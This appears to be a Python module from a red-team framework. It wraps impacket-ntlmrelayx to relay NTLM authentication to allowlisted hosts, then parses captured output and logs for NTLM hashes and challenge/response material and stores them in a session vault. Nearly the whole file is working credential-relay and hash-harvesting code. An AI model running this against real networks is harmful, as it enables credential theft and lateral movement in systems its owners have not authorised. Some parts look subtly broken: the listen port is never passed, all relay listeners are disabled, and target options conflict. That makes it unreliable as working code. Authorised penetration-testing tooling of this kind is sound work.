"""NTLM relay orchestrator with session-vault credential hand-off.

Wraps `impacket-ntlmrelayx` against an explicit target allowlist. After the
run, captured hash/credential-like artifacts are ingested into the encrypted
session vault (when ADAF_SESSION_VAULT_KEY is set) so later capabilities can
consume them without exposing secrets in logs.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target
from adaf_attack.core.vault import VaultError

console = Console()

HASH_LINE_RE = re.compile(
    r"(?P<user>[^:\s]+)::(?P<domain>[^:\s]+):(?P<lm>[0-9A-Fa-f]{32})?:?(?P<nt>[0-9A-Fa-f]{32})?"
)
NTLM_RE = re.compile(r"(?P<label>NTLMv[12])\s+(?P<body>.+)", re.IGNORECASE)


def _build_argv(
    target: Target, relay_targets: list[str], listen_port: int, output_dir: str, extras: list[str]
) -> list[str]:
    argv = [
        "impacket-ntlmrelayx",
        "--no-http-server",
        "--no-wcf-server",
        "--no-raw-server",
        "--no-smb-server",
        "-tf",
        "-",
        "-of",
        output_dir,
        "-smb2support",
    ]
    for host in relay_targets:
        argv.extend(["-t", host])
    argv.extend(extras or [])
    return argv


def _ingest_artifacts_to_vault(session: Session, artifact_paths: list[str]) -> list[dict[str, Any]]:
    """Parse captured files for credential material and store in the session vault."""
    stored: list[dict[str, Any]] = []
    vault = session.vault()
    for path_str in artifact_paths:
        path = Path(path_str)
        if not path.is_file():
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue

        # Hashcat/John style lines
        for match in HASH_LINE_RE.finditer(text):
            name = f"relay-{match.group('user')}-{path.stem}"[:80]
            payload = {
                "username": match.group("user"),
                "domain": match.group("domain"),
                "lm": match.group("lm"),
                "nt": match.group("nt"),
                "source": str(path),
            }
            try:
                vault.put(
                    name,
                    kind="ntlm-hash",
                    value=payload,
                    secret=True,
                    metadata={
                        "username": payload["username"],
                        "domain": payload["domain"],
                        "source": path.name,
                    },
                )
                stored.append({"name": name, "kind": "ntlm-hash", "source": path.name})
            except VaultError as exc:
                stored.append({"name": name, "error": str(exc), "source": path.name})

        for match in NTLM_RE.finditer(text):
            name = f"relay-ntlm-{path.stem}-{len(stored)}"[:80]
            try:
                vault.put(
                    name,
                    kind="ntlm-challenge",
                    value={"label": match.group("label"), "body": match.group("body")[:500]},
                    secret=True,
                    metadata={"source": path.name, "label": match.group("label")},
                )
                stored.append({"name": name, "kind": "ntlm-challenge", "source": path.name})
            except VaultError as exc:
                stored.append({"name": name, "error": str(exc), "source": path.name})

    return stored


@register_capability(
    id="ntlm-relay",
    summary="Run ntlmrelayx against a fixed allowlist; vault captured credentials",
    category="lateral-movement",
    tags=("ntlm-relay", "ntlmrelayx", "coerce", "relay", "vault"),
    destructive=True,
)
class NtlmRelay:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        if not force:
            raise RuntimeError("ntlm-relay is destructive; pass --force to run.")

        relay_targets = kwargs.get("relay_targets")
        if isinstance(relay_targets, str):
            relay_targets = [h.strip() for h in relay_targets.split(",") if h.strip()]
        if not relay_targets:
            raise RuntimeError("Pass -P relay_targets=<host1,host2> (explicit allowlist).")
        listen_port = int(kwargs.get("listen_port", 445))
        duration_seconds = int(kwargs.get("duration_seconds", 60))
        extras_str = kwargs.get("extras") or ""
        extras = extras_str.split() if extras_str else []

        binary = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
        if not binary:
            raise RuntimeError(
                "impacket-ntlmrelayx not on PATH; install with pip install 'adaf-attack[kerberos]'."
            )

        out_dir = session.path("relay-artifacts")
        out_dir.mkdir(parents=True, exist_ok=True)
        argv = _build_argv(target, relay_targets, listen_port, str(out_dir), extras)
        argv[0] = binary

        console.print(
            f"[bold]ntlm-relay[/bold] listen=0.0.0.0:{listen_port} targets={relay_targets} "
            f"for {duration_seconds}s"
        )
        console.print(f"[dim]{' '.join(argv)}[/dim]")

        log_file = session.path("relay.log")
        with log_file.open("w", encoding="utf-8", newline="\n") as fp:
            proc = subprocess.Popen(
                argv,
                stdout=fp,
                stderr=subprocess.STDOUT,
                cwd=str(out_dir),
            )
            session.log("ntlm-relay.started", pid=proc.pid, argv=argv, targets=relay_targets)
            try:
                proc.wait(timeout=duration_seconds)
                returncode = proc.returncode
                truncated = False
            except subprocess.TimeoutExpired:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                returncode = proc.returncode if proc.returncode is not None else -1
                truncated = True

        captured = [str(p) for p in out_dir.rglob("*") if p.is_file()]
        # Always include the relay log for hash scraping
        if str(log_file) not in captured:
            captured.append(str(log_file))

        vault_items = _ingest_artifacts_to_vault(session, captured)
        vault_ok = sum(1 for item in vault_items if "error" not in item)

        for host in relay_targets:
            node = f"COMPUTER@{str(host).upper()}@{target.domain.upper()}"
            graph.add_node(node, "Computer", host=host)
            graph.add_edge(node, node, "NtlmRelayTarget")

        result = {
            "ok": returncode == 0,
            "listen_port": listen_port,
            "relay_targets": relay_targets,
            "duration_seconds": duration_seconds,
            "argv": argv,
            "return_code": returncode,
            "log": str(log_file),
            "artifacts": captured,
            "truncated": truncated,
            "vault_items": vault_items,
            "vault_stored": vault_ok,
            "note": (
                "Captured credential material is stored encrypted in the session vault when "
                "ADAF_SESSION_VAULT_KEY is set. Public index remains redacted."
            ),
        }
        out = session.path("ntlm-relay.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        session.register_cleanup(
            {
                "kind": "ntlm-relay",
                "target": ",".join(relay_targets),
                "artifact": str(log_file),
                "rollback": (
                    "Review captured artifacts for writes performed via relay "
                    "(shadow-creds, RBCD, cert enrollment, etc.) and revert as authorized."
                ),
            }
        )
        session.log(
            "ntlm-relay.complete",
            listen_port=listen_port,
            relay_targets=relay_targets,
            return_code=returncode,
            artifact_count=len(captured),
            vault_stored=vault_ok,
        )
        graph.save(session.path("graph.json"))
        console.print(
            f"[green]Done[/green]  artifacts={len(captured)}  "
            f"vault_stored={vault_ok}  rc={returncode}"
        )
        if vault_ok == 0 and vault_items:
            console.print(
                "[yellow]Vault storage failed — set ADAF_SESSION_VAULT_KEY (Fernet) "
                "to persist captured material encrypted.[/yellow]"
            )
        return result
